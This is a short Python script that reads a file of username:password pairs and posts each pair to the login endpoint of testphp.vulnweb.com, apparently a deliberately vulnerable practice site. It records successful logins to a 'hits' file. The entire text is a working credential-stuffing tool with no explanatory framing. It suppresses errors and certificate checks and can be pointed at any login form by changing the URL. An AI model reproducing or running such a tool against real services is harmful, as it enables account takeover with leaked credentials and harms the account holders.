import requests
requests.urllib3.disable_warnings()
ask=input("give me file txt: ")
with open(ask,"r") as f:
    for line in f:
        strip=line.rstrip()
        split=strip.split(":")
        user=split[0]
        passwd=split[1]
        try:

            burp0_url = "http://testphp.vulnweb.com:80/userinfo.php"
            burp0_headers = {"Cache-Control": "max-age=0", "Upgrade-Insecure-Requests": "1", "Origin": "http://testphp.vulnweb.com", "Content-Type": "application/x-www-form-urlencoded", "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36", "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7", "Referer": "http://testphp.vulnweb.com/login.php", "Accept-Encoding": "gzip, deflate, br", "Accept-Language": "fr-FR,fr;q=0.9,en-US;q=0.8,en;q=0.7,ar;q=0.6", "Connection": "keep-alive"}
            burp0_data = {"uname": user, "pass": passwd}
            x=requests.post(burp0_url, headers=burp0_headers, data=burp0_data, timeout=10, allow_redirects=False,verify=False)

            if "Credit" in x.text:
                print(f"hit:{user}:{passwd}")
                with open("hist.txt","a") as save:
                    print(f"{user}:{passwd}",file=save)
            else:
                print("not work")
        except:
            pass